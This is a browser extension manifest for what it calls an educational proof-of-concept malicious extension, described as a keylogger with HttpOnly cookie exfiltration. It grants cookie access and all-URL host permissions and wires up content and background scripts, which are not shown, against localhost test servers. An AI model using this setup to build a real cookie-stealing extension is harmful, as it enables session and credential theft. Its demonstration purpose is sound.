{
  "manifest_version": 3,
  "name": "POC Malicious Extension",
  "version": "1.0.0",
  "description": "Educational POC: keylogger + HttpOnly cookie exfiltration. Do not use for unauthorized access.",
  "permissions": [
    "cookies"
  ],
  "host_permissions": [
    "<all_urls>",
    "http://localhost:3000/*",
    "http://localhost:4000/*"
  ],
  "content_scripts": [
    {
      "matches": ["http://localhost:3000/*"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ],
  "background": {
    "service_worker": "background.js"
  }
}
